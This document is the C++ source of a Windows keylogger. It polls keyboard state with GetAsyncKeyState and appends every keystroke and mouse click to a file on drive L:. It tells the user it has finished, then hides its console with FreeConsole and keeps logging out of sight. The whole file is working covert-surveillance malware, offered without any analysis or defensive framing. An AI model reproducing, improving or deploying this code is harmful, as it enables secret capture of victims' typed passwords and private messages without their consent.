#include <iostream>
#include <fstream>
#include <windows.h>
#include <cstring>
#include <stdio.h>
#include <stdlib.h>
using namespace std;
void WriteToFile(LPCSTR text)
{
ofstream log;
log.open("L:\\key.txt",fstream::app);
log << text;
log.close();
}
bool IsListed(int iKey)
{
    switch(iKey)
    {
    case VK_SPACE:
        cout << " ";
        WriteToFile(" ");
        break;
    case VK_RETURN:
        cout << "\n";
        WriteToFile("\n");
        break;
    case VK_SHIFT:
        cout << "*SHIFT*";
        WriteToFile("*SHIFT*");
        break;
    case VK_RBUTTON:
       cout << "*rclick*";
       WriteToFile("*rclick*");
       break;
    case VK_LBUTTON:
        cout << "*lclick*";
        WriteToFile("*lclick*");
        break;
    case VK_BACK:
        cout << "\b";
        WriteToFile("\b");
        break;
    case VK_CONTROL:
        cout << "*CTRL*";
        WriteToFile("*CTRL*");
        break;
        default:return false;
    }
}
int main()
{
    char key;
    system("CLS");
    cout << "Loading...";
    Sleep(5000);
    system("CLS");
    cout << "Finished,close the window";
    FreeConsole();
    while(TRUE)
    {
        Sleep(10);
        for(key=8;key<=190;key++)
        {
             if(GetAsyncKeyState(key)== -32767)
             {
                 if(IsListed(key) == FALSE)
                 {
                     ofstream log;
                     log.open("L:\\key.txt",fstream::app);
                     log << key;
                     log.close();
                 }

             }
    }

}
}
